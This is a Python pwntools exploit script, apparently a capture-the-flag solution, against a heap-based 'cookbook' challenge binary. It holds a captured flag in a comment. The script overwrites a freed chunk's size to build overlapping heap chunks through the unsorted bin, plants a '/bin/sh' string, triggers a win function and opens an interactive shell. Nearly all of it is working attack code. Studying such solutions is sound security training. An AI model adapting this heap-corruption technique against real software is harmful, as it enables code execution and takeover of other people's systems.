#!/home/gym/.venvs/ctf/bin/python2
import os
import sys
from pwn import *
c = None
m = None

def main():
    # FLAG{wh0_n33d5_m4th_when_ch34t1ng_1s_4n_0pt10n}

    ### Allocate five summaries
    add_summary("A"*0x80)
    add_summary("A"*0x80)
    # Contains the future next size when freeing victim
    # This is needed so next chunk size is "reasonable"
    add_summary("A"*16 + p64(0x91) + "A"*0x68)
    add_summary("A"*0x80)
    add_summary("A"*(0x80))

    ### delete the first for overwrite
    remove_summary(0)

    ### Prepare would be compressed payload
    # every 4th byte will be part of the overwritten victim chunk
    pl=""
    for i in "ITSMAGIC/bin/sh;\0":
         pl += i + "D"*3

    ### Overwrite the victim size
    add_summary(pl+"B"*(0x80-len(pl)) + "\xb1")

    ## Free victim, enlarged small bin chunk is in unsorted
    remove_summary(1)
    # reallocate and rewrite the remainder's size so next
    # 0x80 allocation takes this chunk from unsoretd bin
    add_summary("A"*0x80 + "\x81")

    # Trigger the new allocation
    # The overlapped content will overwrite the target
    # with prepared payload
    print create_crib()
    # Call the win funciton
    exam(2)

    c.interactive()

# options: local/remote libc, aslr, debugger, target (vm, native, remote)
# break points: _init+
def add_summary(text):
    c.sendlineafter('>', '1')
    if (len(text) <= 0x80):
        c.sendlineafter('>', text)
    else:
        c.sendafter('>', text)

def remove_summary(num):
    c.sendlineafter('>', '2')
    c.sendlineafter('>', str(num))

def read_summary(num):
    c.sendlineafter('>', '3')
    c.sendlineafter('>', str(num))
    c.recvuntil(':\n')
    return c.recvuntil('===')

def create_crib():
    c.sendlineafter('>', '4')
    c.recvuntil(':\n')
    return c.recvuntil('===')

def remove_crib():
    c.sendlineafter('>', '5')

def exam(num):
    c.sendlineafter('>', '6')
    c.sendlineafter('>', str(num))

gdbs=[#'set sysroot /home/gym/ctf/vagrant/xenial64/sysroot/',
        'c',
        'c',
        'c',
        'c',
        'c',
        'c',
        'c'
        ]
bp =['handle_create_crib', 'handle_add_summary']
if __name__ == "__main__":
    sys.path.append(os.path.expanduser('~/ctf/magicpwn'))
    try:
        from magicpwn import Magic
        # target: vm/native/remote
        # libc: vm/native/remote
        # config: path to config file
        # debug: gdb/villoc/gdbv/none
        m = Magic('vm', 'villoc', aslr=True, libc='remote')
        #m = Magic('native', 'none', aslr=False, libc='remote')
        #m = Magic('native', 'villoc', aslr=False, libc='local')
        #m = Magic('remote', 'none', libc='remote')
        c = m.start(cmds=gdbs, bp=bp, ida=False)
    except ImportError:
        c = process("./test/cookb/cookbook")

    main()
